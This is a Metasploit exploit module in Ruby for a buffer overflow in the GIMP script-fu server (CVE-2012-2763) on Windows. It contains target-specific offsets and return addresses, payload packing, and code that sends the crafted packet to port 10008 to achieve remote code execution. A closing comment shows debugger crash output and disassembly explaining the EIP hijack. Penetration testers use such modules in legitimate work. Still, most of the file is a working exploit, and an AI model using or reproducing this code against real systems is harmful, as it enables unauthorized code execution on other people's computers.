##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'GIMP script-fu Server Buffer Overflow',
      'Description'    => %q{
        This module exploits a buffer overflow in the script-fu server
        component on GIMP <= 2.6.12. By sending a specially crafted packet, an
        attacker may be able to achieve remote code execution under the context
        of the user.

        This module has been tested on GIMP for Windows from installers
        provided by Jernej Simoncic.
      },
      'Author'         =>
        [
          'Joseph Sheridan', # Vulnerability Discovery and PoC
          'juan vazquez' # Metasploit module
        ],
      'Version'        => '$Revision: $',
      'References'     =>
        [
          [ 'CVE', '2012-2763' ],
          [ 'OSVDB', '82429' ],
          [ 'BID', '53741' ],
          [ 'EDB', '18956' ],
          [ 'URL', 'http://www.reactionpenetrationtesting.co.uk/advisories/scriptfu-buffer-overflow-GIMP-2.6.html' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'Space'    => 1024,
          'BadChars' => "\x00\x09\x0a\x0d\x20\x28\x29\x3b"  + (0x80..0xff).to_a.pack("C*"),
          'DisableNops' => true,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'GIMP 2.6.10 (no DEP) / Windows XP SP3 / Windows 7 SP1',
            {
              'Offset' => 1102,
              'Ret' => 0x00425a52,
              'BufferRegister' => 'EDX'
            }
          ],
          [ 'GIMP 2.6.1 (no DEP) / Windows XP SP3 / Windows 7 SP1',
            {
              'Offset' => 1086,
              'Ret' => 0x00425a22,
              'BufferRegister' => 'EAX'
            }
          ]
        ],
      'Privileged'     => true,
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'May 18 2012'))

    register_options([Opt::RPORT(10008)], self.class)
  end

  def exploit
    connect

    payload.encoder.datastore.import_options_from_hash({ 'BufferRegister' => target['BufferRegister'] })
    my_payload = payload.generate
    sploit = my_payload
    sploit << rand_text(target['Offset'] - my_payload.length)
    sploit << [target.ret].pack("V")

    pkt = "\x47" # Magic
    pkt << [sploit.length / 256].pack("C") # length_of_script_fu (high byte)
    pkt << [sploit.length % 256].pack("C") # length_of_script_fu (low byte)
    pkt << sploit

    print_status("Trying target #{target.name}...")
    sock.put(pkt)

    handler
    disconnect
  end

end

=begin

* Crash example:

0:003> g
(b2c.b28): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Module load completed but symbols could not be loaded for C:\Program Files\GIMP-2.0\lib\gimp\2.0\plug-ins\script-fu.exe
eax=00000000 ebx=0041e523 ecx=61616161 edx=61616161 esi=003ed200 edi=00000001
eip=61616161 esp=0022f87c ebp=0022f898 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
61616161 ??              ???
0:000> kb
ChildEBP RetAddr  Args to Child
WARNING: Frame IP not in any known module. Following frames may be wrong.
0022f878 0040c86f 00000000 0041e523 00000007 0x61616161
0022f898 0040c944 00000000 0041e523 00000007 script_fu+0xc86f
0022f8c8 004102fe 00420240 0041e523 0022f918 script_fu+0xc944
0022f918 0040e6ca 00420240 00000086 77c303ad script_fu+0x102fe
0022fb78 0040ea8e 00ff2c38 00f32df0 0022fba8 script_fu+0xe6ca
0022fba8 004087cf 00420240 00ff2c38 00989680 script_fu+0xea8e
0022fbc8 00407f8a 00ff2c38 00f32df0 00000000 script_fu+0x87cf
0022fe18 00408601 00f7a040 00000000 00000001 script_fu+0x7f8a
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\GIMP-2.0\bin\libgimp-2.0-0.dll -
0022fe78 6f4c304b 003ec238 00000001 003ec3c8 script_fu+0x8601
0022ff28 00401a81 0041b510 00000006 003e4878 libgimp_2_0_0!gimp_main+0x73b
0022ff58 004010db 00000006 003e4878 003e29e8 script_fu+0x1a81
0022ffa0 00401158 00000002 8061750d 7c90dc9c script_fu+0x10db
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\system32\kernel32.dll -
0022ffc0 7c817067 00017228 1474f685 7ffda000 script_fu+0x1158
0022fff0 00000000 00401140 00000000 78746341 kernel32!RegisterWaitForInputIdle+0x49

* Control is reached here:

.text:0040C851 loc_40C851:                             ; CODE XREF: sub_40C830+19j
.text:0040C851                 test    edx, edx
.text:0040C853                 jz      short loc_40C84B
.text:0040C855                 mov     ecx, ds:dword_420E24
.text:0040C85B                 mov     [esp+18h+var_14], ebx
.text:0040C85F                 mov     [esp+18h+var_C], ecx
.text:0040C863                 mov     [esp+18h+var_10], eax
.text:0040C867                 mov     eax, [ebp+arg_0]
.text:0040C86A                 mov     [esp+18h+var_18], eax
.text:0040C86D                 call    edx ; dword_420E20 : Overwriting dword_420E20 allows to get EIP

The overflow allows to overwrite function pointers stored in the .bss (unitialized
global variables)

0:003> g
Breakpoint 0 hit
eax=00000000 ebx=0041e523 ecx=bfbfbf00 edx=42424242 esi=003ed200 edi=00000001
eip=0040c86d esp=0022f880 ebp=0022f898 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
script_fu+0xc86d:
0040c86d ffd2            call    edx {42424242}

=end